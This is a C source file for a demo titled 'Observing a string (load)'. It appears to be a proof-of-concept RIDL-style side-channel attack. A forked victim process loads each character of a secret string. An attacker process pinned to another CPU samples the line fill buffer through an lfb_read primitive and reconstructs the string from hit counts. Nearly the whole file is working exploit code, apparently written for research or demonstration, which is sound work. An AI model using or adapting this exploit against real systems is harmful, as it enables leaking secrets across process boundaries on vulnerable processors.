#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils.h"


#define REPS 200000
#define WRITE_VALUE 42ull
#define CYCLE_LENGTH 400000000


int writer_cpu = 3, reader_cpu = 7, pid = 0;
int hits[256];

inline void *victim(char *secret, int cycle_length) {
    set_processor_affinity(writer_cpu);

    int length = strlen(secret);
    struct timespec spec;
    clock_gettime(CLOCK_REALTIME, &spec);
    uint64_t t;
    usleep(cycle_length / 1000);
    uint64_t *destination = aligned_alloc(_page_size, _page_size);

    for (int i = 0; i < length; i++) {
        t = time_convert(&spec);
        destination[0] = (uint64_t) secret[i];
        while (time_convert(&spec) - t < cycle_length) {
            int j = 1000;
            while (j--) load_and_flush(destination);
            clock_gettime(CLOCK_REALTIME, &spec);
        }
    }
    destination[0] = 7;
    while (1) { load_and_flush(destination); }
}

void attacker(void *mem, int cycle_length) {
    set_processor_affinity(reader_cpu);

    struct timespec spec;
    uint64_t t;

    clock_gettime(CLOCK_REALTIME, &spec);
    t = time_convert(&spec);
    while (1) {
        memset(hits, 0, sizeof(hits[0]) * 256);
        while (time_convert(&spec) - t < cycle_length) {
            int reps = 1000;
            while (reps--) {
                int value = lfb_read(mem);
                if (value > 0) hits[value & 0xFF]++;
            }
            clock_gettime(CLOCK_REALTIME, &spec);
        }
        int max = -1, max_i = 0;
        for (int i = 1; i < 256; i++) {
            if (hits[i] > max) {
                max_i = i;
                max = hits[i];
            }
        }
        clock_gettime(CLOCK_REALTIME, &spec);
        t = time_convert(&spec);
        printf("%c", max_i);
        fflush(stdout);
        if (max_i == 7) break;
    }
    printf("\n");
}


int main() {
    printf("Demo 2b: Observing a string (load)\n");
    _page_size = getpagesize();
    time_t tm;
    time(&tm);
    srand(tm);
    char *secret = sample_strings[random() % 3];
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    ridl_init();
    pid = fork();
    if (!pid) {
        victim(secret, CYCLE_LENGTH);
        return 0;
    }
    attacker(mem, CYCLE_LENGTH);
    kill(pid, SIGKILL);
    usleep(10000);

    ridl_cleanup();
    printf("Done.\n");
    return 0;
}

